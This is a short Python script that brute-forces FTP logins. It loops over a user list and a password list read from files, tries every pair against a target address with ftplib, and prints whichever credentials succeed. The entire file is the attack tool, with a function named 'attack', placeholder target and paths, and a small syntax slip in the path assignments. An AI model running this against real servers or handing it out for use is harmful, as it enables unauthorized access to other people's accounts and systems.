import ftplib

def attack(ip, user, password):
    ftp = ftplib.FTP(ip)
    try:
        ftp.login(user, password)
        ftp.quit()
        print('User: {}, Password: {}'.format(user, password))
    except:
        print("Authentication failed")

ip = '0.0.0.0'
passwords_file = r '' #path
users_file = r '' #path

# Read Users from file
with open(users_file, 'r') as users_file:
    users = users_file.read().splitlines()

# Read passwords from file
with open(passwords_file, 'r') as passwords_file:
    passwords = passwords_file.read().splitlines()

for user in users:
    for password in passwords:
        attack(ip, user, password)

